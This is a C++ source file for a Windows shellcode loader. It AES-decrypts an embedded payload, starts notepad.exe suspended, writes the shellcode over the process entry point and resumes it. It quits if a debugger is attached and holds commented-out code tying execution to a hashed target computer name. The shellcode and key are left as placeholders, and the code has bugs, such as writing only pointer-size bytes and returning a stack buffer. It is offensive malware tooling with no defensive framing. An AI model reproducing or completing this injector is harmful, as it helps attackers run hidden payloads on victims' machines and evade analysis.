#include <windows.h>
#include <string>
#include <stdio.h>
#include <winternl.h>
#include <cstdio>

#pragma comment(lib, "ntdll")

int AESDecrypt(char* payload, DWORD payload_len, char* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, &payload_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}

void addressOfEntryPointInjection(unsigned char* shellcode, int shellcode_len) {
	STARTUPINFOA si;
	si = {};
	PROCESS_INFORMATION pi = {};
	PROCESS_BASIC_INFORMATION pbi = {};
	DWORD returnLength = 0;
	CreateProcessA(0, (LPSTR)"c:\\windows\\system32\\notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);

	// get target image PEB address and pointer to image base
	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	DWORD pebOffset = (DWORD)pbi.PebBaseAddress + 8;

	// get target process image base address
	LPVOID imageBase = 0;
	ReadProcessMemory(pi.hProcess, (LPCVOID)pebOffset, &imageBase, 4, NULL);

	// read target process image headers
	BYTE headersBuffer[4096] = {};
	ReadProcessMemory(pi.hProcess, (LPCVOID)imageBase, headersBuffer, 4096, NULL);

	// get AddressOfEntryPoint
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
	LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD)imageBase);

	// write shellcode to image entry point and execute it
	WriteProcessMemory(pi.hProcess, codeEntry, shellcode, sizeof(shellcode), NULL);
	ResumeThread(pi.hThread);

}

char* getComputerName() {
	char buffer[64];
	DWORD length = sizeof(buffer);
	bool ok = GetComputerNameA((LPSTR)buffer, &length);

	if (ok) {
		return buffer;
	}

	return NULL;
}

char* HashMD5(char* data) {
	DWORD dwStatus = 0;
	DWORD cbHash = 16;
	int i = 0;
	HCRYPTPROV cryptProv;
	HCRYPTHASH cryptHash;
	BYTE hash[16];
	const char* hex = "0123456789abcdef";
	char* strHash;
	strHash = (char*)malloc(500);
	memset(strHash, '\0', 500);
	if (!CryptAcquireContext(&cryptProv, NULL, MS_DEF_PROV, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
		return NULL;
	}
	if (!CryptCreateHash(cryptProv, CALG_MD5, 0, 0, &cryptHash)) {
		CryptReleaseContext(cryptProv, 0);
		return NULL;
	}
	if (!CryptHashData(cryptHash, (BYTE*)data, strlen(data), 0)) {
		CryptReleaseContext(cryptProv, 0);
		CryptDestroyHash(cryptHash);
		return NULL;
	}
	if (!CryptGetHashParam(cryptHash, HP_HASHVAL, hash, &cbHash, 0)) {
		CryptReleaseContext(cryptProv, 0);
		CryptDestroyHash(cryptHash);
		return NULL;
	}
	for (i = 0; i < cbHash; i++) {
		strHash[i * 2] = hex[hash[i] >> 4];
		strHash[(i * 2) + 1] = hex[hash[i] & 0xF];
	}
	CryptReleaseContext(cryptProv, 0);
	CryptDestroyHash(cryptHash);
	return strHash;
}


void check_arround()
{
	if (IsDebuggerPresent())
	{
		exit(-1);
	}
	
	// Instert Target Hash
        
	
	/*const char* tcnhash = "24770acdd756e67cae2b56948929c8c7";
	
	{
		printf("No No No! Wont Happen\n");
		exit(-1);
	}*/

}

int main(int argc, char* argv[])
{
	check_arround();
	
	// Insert Shellcode Here!
        
        
        
	
	AESDecrypt((char*)moca, sizeof(moca), (char*)key, sizeof(key));

	addressOfEntryPointInjection(moca, sizeof(moca));

	return 0;
}
